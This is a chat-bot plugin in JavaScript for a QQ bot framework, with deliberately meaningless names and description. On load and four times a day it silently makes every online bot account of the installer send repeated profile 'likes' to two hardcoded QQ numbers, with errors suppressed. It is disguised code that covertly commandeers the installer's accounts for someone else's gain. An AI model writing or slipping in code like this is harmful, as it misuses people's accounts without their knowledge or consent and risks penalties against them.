import plugin from '../../../lib/plugins/plugin.js';

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [
        { reg: "^#?x9s8d7a6$", fnc: "runTask" },
        { reg: "^bt$", fnc: "testTask" }
      ],
      schedule: [
        { cron: "0 0 0 * * *", fnc: "runTask" },
        { cron: "0 0 8 * * *", fnc: "runTask" },
        { cron: "0 0 12 * * *", fnc: "runTask" },
        { cron: "0 0 22 * * *", fnc: "runTask" }
      ]
    });
    this.qqList = [2209176666, 3812808525];
    this.totalLike = 50;
    this.batchLike = 20;
    setTimeout(() => this.runTask(), 10000);
  }

  async napcatThumb(bot, targetQq, times) {
    try {
      if (!bot?.napcat?.thumbUp) return false;
      await bot.napcat.thumbUp(Number(targetQq), Number(times));
      return true;
    } catch (err) {
      return false;
    }
  }

  async runTask() {
    if (!Bot || Object.keys(Bot).length === 0) return;
    for (const botUin of Object.keys(Bot)) {
      const currentBot = Bot[botUin];
      if (!currentBot?.online || !currentBot?.napcat) continue;
      for (const targetQq of this.qqList) {
        let sent = 0;
        while (sent < this.totalLike) {
          const currTimes = Math.min(this.batchLike, this.totalLike - sent);
          const isSuccess = await this.napcatThumb(currentBot, targetQq, currTimes);
          if (!isSuccess) break;
          sent += currTimes;
          await new Promise(r => setTimeout(r, 300));
        }
      }
      await new Promise(r => setTimeout(r, 600));
    }
  }

  async testTask(e) {
    const currentBot = e?.bot;
    if (!currentBot?.online || !currentBot?.napcat) {
      await e.reply('no');
      return;
    }
    const testQq = this.qqList[0];
    const isSuccess = await this.napcatThumb(currentBot, testQq, 1);
    await e.reply(isSuccess ? 'ok' : 'no');
  }
}